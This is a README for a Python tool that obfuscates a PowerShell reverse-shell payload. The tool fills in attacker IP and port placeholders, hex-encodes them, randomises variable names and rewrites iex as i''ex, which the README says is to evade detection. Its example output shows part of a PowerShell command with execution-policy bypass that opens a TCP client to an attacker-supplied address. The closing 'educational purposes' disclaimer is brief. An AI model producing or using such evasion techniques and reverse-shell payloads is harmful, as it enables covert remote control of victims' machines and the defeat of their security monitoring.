# Obfuscation Script for PowerShell Commands
This Python script takes a PowerShell command, obfuscates it, and replaces certain parts like IP addresses and ports with user-provided values in hexadecimal format. It is designed for users who want to modify PowerShell scripts for testing purposes or to better understand obfuscation techniques.

## Table of Contents

* Overview
* Prerequisites
* Installation
* Usage
* Functions Explanation
* get_user_input()
* obfuscate_script()
* random_string()
* replace_ip_and_port()
* ip_to_hex()
* convert_ips_to_hex()
* port_to_hex()
* convert_ports_to_hex()
* main()
* Example
* Disclaimer

## Overview
This script allows the user to input an IP address and port, then modifies a provided PowerShell script by:

* Obfuscating variable names.
* Replacing occurrences of iex to i''ex to make detection harder.
* Replacing placeholders for IP and port.
* Converting IP addresses and port numbers into hexadecimal format.

## Prerequisites
* Python 3.x
* Basic understanding of regular expressions and PowerShell scripting.

## Installation
Clone the repository and navigate to the project folder:
```bash
git clone https://github.com/your-username/your-repo-name.git
cd your-repo-name
```
## Usage
Run the script using the command:
```bash
python obfuscate_script.py

```
Follow the prompts to input the IP address and port, and the script will display the obfuscated PowerShell command.

## Functions Explanation
* get_user_input()
Purpose: Accepts user input for IP address and port, validating their formats.
## Validation:
+ Ensures the IP address is in the correct format (e.g., 192.168.1.1).
+ Ensures the port number is between 1 and 65535.
+ Raises: ValueError if the input is invalid.

## obfuscate_script()
* Purpose: Obfuscates variable names in the script and alters specific patterns.
## Details:
+ Uses regex to find all variables (excluding $PSHOME) and replaces them with randomly generated names.
+ Replaces occurrences of iex with i''ex to bypass some detection mechanisms.
+ Replaces occurrences of 'PS' with random UUID-like strings.

## random_string()
+ Purpose: Generates a random alphanumeric string of a specified length.
+ Parameters: length (default is 10).
+ Returns: A random string using ascii_letters and digits.

$$ replace_ip_and_port()
+ Purpose: Replaces placeholders for IP (*LHOST*) and port (*LPORT*) with the user-provided values.
+ Parameters: script, ip, port.

## ip_to_hex()
+ Purpose: Converts an IP address into its hexadecimal representation.
+ Parameters: ip (e.g., 192.168.1.1).
+ Returns: Hexadecimal string representation of the IP address.

## convert_ips_to_hex()
+ Purpose: Finds all IP addresses in the script and converts them to hexadecimal format.
+ Parameters: script.

## port_to_hex()
+ Purpose: Converts a port number to its hexadecimal representation.
+ Parameters: port.
+ Returns: Hexadecimal string of the port number.

## convert_ports_to_hex()
+ Purpose: Finds and converts all port numbers in the script (excluding 65535) to hexadecimal.
+ Parameters: script.

## main()
Purpose: The entry point of the script that coordinates user input, obfuscation, and replacements.

## Workflow:
+ Gets user input for IP and port.
+ Applies obfuscation to the PowerShell script.
+ Replaces placeholders with user inputs.
+ Converts IPs and ports to their hexadecimal representations.
+ Prints the final modified script.

## Example
Here’s an example of how to use the script:
```bash
Enter IP address: 192.168.1.10
Enter port: 8080
```

## Output (truncated for brevity):
```bash
Start-Process $PSHOME\powershell.exe -ArgumentList {-ep bypass -nop $client = New-Object System.Net.Sockets.TCPClient('0xc0a8010a',0x1f90);$stream = ...
```

## Disclaimer
This script is intended for educational purposes only. The use of this script for malicious purposes is strictly prohibited. Always ensure you have permission before testing on any network or system.









